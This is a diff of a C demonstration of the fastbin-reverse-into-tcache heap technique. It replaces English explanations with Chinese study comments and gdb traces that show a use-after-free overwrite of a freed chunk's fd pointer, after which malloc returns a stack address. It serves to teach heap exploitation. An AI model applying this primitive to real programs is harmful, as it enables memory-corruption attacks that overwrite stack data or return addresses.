@@ -20,7 +20,7 @@ int main(){
     "(More than 7 times works fine too.)\n\n"
   );
 
-  // Fill the tcache.
+  // 这里先将tcachebin中allocsize大小的链填满
   for (i = 0; i < 7; i++) {
     free(ptrs[i]);
   }
@@ -32,17 +32,11 @@ int main(){
     "already full, it will go in the fastbin.\n\n",
     victim
   );
+  //此时释放的victim就会将这个free chunk添加到fastbin对应大小的链中
   free(victim);
 
-  printf(
-    "Next we need to free between 1 and 6 more pointers. These will also go\n"
-    "in the fastbin. If the stack address that we want to overwrite is not zero\n"
-    "then we need to free exactly 6 more pointers, otherwise the attack will\n"
-    "cause a segmentation fault. But if the value on the stack is zero then\n"
-    "a single free is sufficient.\n\n"
-  );
 
-  // Fill the fastbin.
+  // 释放后面的六个chunk,填满这个fastbin。
   for (i = 8; i < 14; i++) {
     free(ptrs[i]);
   }
@@ -66,54 +60,49 @@ int main(){
 
   //------------VULNERABILITY-----------
 
-  // Overwrite linked list pointer in victim.
+  // 这里使用UAF漏洞进行的修改内存操作,修改了原来victim所在的那个chunk的fd指针的位置
+  //修改前
+  //Free chunk (fastbins) | PREV_INUSE
+  //Addr: 0x555555757480
+  //Size: 0x51
+  //fd: 0x00
+
   *(size_t**)victim = &stack_var[0];
 
-  //------------------------------------
+  //修改后
+  //Free chunk (fastbins) | PREV_INUSE
+  //Addr: 0x555555757480
+  //Size: 0x51
+  //fd: 0x7fffffffddd0
+  //可以看出这个chunk的fd指针不再是0x00
 
-  printf(
-    "The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"
-  );
-
-  // Empty tcache.
+  // 这里先清空掉allocsize这条tcachebin链上的所有chunk
   for (i = 0; i < 7; i++) {
     ptrs[i] = malloc(allocsize);
   }
 
-  printf(
-    "Let's just print the contents of our array on the stack now,\n"
-    "to show that it hasn't been modified yet.\n\n"
-  );
-
-  for (i = 0; i < 6; i++) {
-    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
-  }
-
-  printf(
-    "\n"
-    "The next allocation triggers the stack to be overwritten. The tcache\n"
-    "is empty, but the fastbin isn't, so the next allocation comes from the\n"
-    "fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"
-    "Those 7 chunks are copied in reverse order into the tcache, so the stack\n"
-    "address that we are targeting ends up being the first chunk in the tcache.\n"
-    "It contains a pointer to the next chunk in the list, which is why a heap\n"
-    "pointer is written to the stack.\n"
-    "\n"
-    "Earlier we said that the attack will also work if we free fewer than 6\n"
-    "extra pointers to the fastbin, but only if the value on the stack is zero.\n"
-    "That's because the value on the stack is treated as a next pointer in the\n"
-    "linked list and it will trigger a crash if it isn't a valid pointer or null.\n"
-    "\n"
-    "The contents of our array on the stack now look like this:\n\n"
-  );
-
+  //现在申请一块allocsize大小的内存，首先会检测tcachebin中是否有空闲块，tcachebin中没有对应的空闲块，就会从fastbin中先取出一个，之后将fastbin中的chunk反向挂到tcachebin中
+  //fastbins
+  //0x50: 0x555555757660 —▸ 0x555555757610 —▸ 0x5555557575c0 —▸ 0x555555757570 —▸ 0x555555757520 ◂— ...
+  //由于gdb没有显示完全，所有在这条链后面应该还有0x5555557574d0 —▸ 0x555555757480 —▸ 0x7fffffffddd0 —▸ 0xcdcdcdcdcdcdcdcd
   malloc(allocsize);
 
+  //申请内存后
+  //tcachebins
+  //0x50 [  7]: 0x7fffffffdde0 —▸ 0x555555757490 —▸ 0x5555557574e0 —▸ 0x555555757530 —▸ 0x555555757580 —▸ 0x5555557575d0 —▸ 0x555555757620 ◂— 0x0
+  //fastbins
+  //0x50: 0xcdcdcdcdcdcdcdcd
+  //这里倒序插入tcache的原因应该是fastbin是单链结构，只能从头取，再头插法插入tcachebin中，就形成了倒叙
   for (i = 0; i < 6; i++) {
     printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
   }
-
+  //此时我们再取一个allocsize大小的内存块就会拿到栈上的地址，通过对堆的操作直接修改栈的值
+  
   char *q = malloc(allocsize);
+  
+  //gdb-peda$ p q
+  //$3 = 0x7fffffffdde0 "\220tuUUU"
+  //这里就可以到stack_var[2]以及之后allocsize大小内存的局部变量内容，影响程序，
   printf(
     "\n"
     "Finally, if we malloc one more time then we get the stack address back: %p\n",
@@ -124,3 +113,16 @@ int main(){
 
   return 0;
 }
+
+//通过这个演示案例，可以看到UAF漏洞，在有的时候是可以让程序通过堆来对栈的内容进行操作，这里如果allocsize够大就有可能修改函数的返回值，大多数程序都会开启canary,
+//所以更常见的情况是修改变量的值
+
+
+
+
+
+
+
+
+
+
